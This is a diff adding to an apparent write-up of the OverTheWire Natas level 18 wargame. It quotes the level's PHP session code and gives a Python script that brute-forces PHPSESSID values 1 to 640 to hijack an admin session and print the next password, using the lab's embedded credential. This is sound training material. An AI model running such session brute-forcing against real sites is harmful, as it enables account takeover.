@@ -89,3 +89,83 @@ if($showform) {
 ?>
 
 ```
+
+#### Important things to consider
+1. maxid = 640 !, they said that should be enough
+```php
+<?
+$maxid = 640; // 640 should be enough for everyone
+?>
+```
+
+2. The use of cookies, which of course we can control.
+```php
+<?
+function my_session_start() { /* {{{ */
+    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
+    if(!session_start()) {
+        debug("Session start failed");
+        return false;
+    } else {
+        debug("Session start ok");
+        if(!array_key_exists("admin", $_SESSION)) {
+        debug("Session was old: admin flag set");
+        $_SESSION["admin"] = 0; // backwards compatible, secure
+        }
+        return true;
+    }
+    }
+
+    return false;
+} 
+?>
+```
+
+This is a very interesting function to consider, because it works with `cookies `, to get the password for the next level we should login as admin, and the admin account has `admin` session variable set to 1.  
+There must be a session that has `admin` session variable set to 1.So let's bruteforce all sessions.
+
+Here is my short python code
+
+```python
+#!/usr/bin/python3
+
+# coding: utf-8
+
+
+import requests
+import re
+
+URL = "http://natas18.natas.labs.overthewire.org"
+
+session = requests.Session()
+session.auth  = ('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
+
+# we have only 640 id's
+
+cookies = {'PHPSESSID': ''}
+
+for i in range(1, 640+1):
+    cookies['PHPSESSID'] = str(i)
+    req = session.get(URL, cookies=cookies)
+    if 'regular user' not in req.text:
+        m = re.search(r"Password: ([a-zA-Z0-9]+)", req.text)
+        if m:
+            print(m.group(0))
+            break
+
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
